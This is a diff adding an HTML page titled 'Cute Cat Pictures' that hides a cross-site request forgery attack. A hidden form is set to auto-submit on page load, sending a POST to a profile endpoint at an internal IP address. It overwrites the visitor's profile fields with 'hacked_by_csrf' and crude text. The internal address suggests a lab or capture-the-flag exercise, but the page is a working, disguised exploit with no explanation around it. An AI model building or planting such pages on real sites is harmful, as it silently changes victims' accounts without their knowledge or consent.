@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cute Cat Pictures</title>
+</head>
+<body>
+    <h1>Adorable Cat Pictures!</h1>
+    <img src="https://placecats.com/300/200" alt="Cute cat">
+    
+    <form id="csrfForm" action="http://172.19.0.3/company/profile" method="POST" style="display:none;">
+        <input type="text" name="name" value="hacked_by_csrf">
+        <input type="text" name="location" value="gooning">
+        <input type="text" name="about" value="This profile was changed via CSRF! -> gooner enjoyer 123 ">
+    </form>
+    
+    <script>
+        // Submit the form immediately when page loads
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        }
+    </script>
+</body>
+</html>
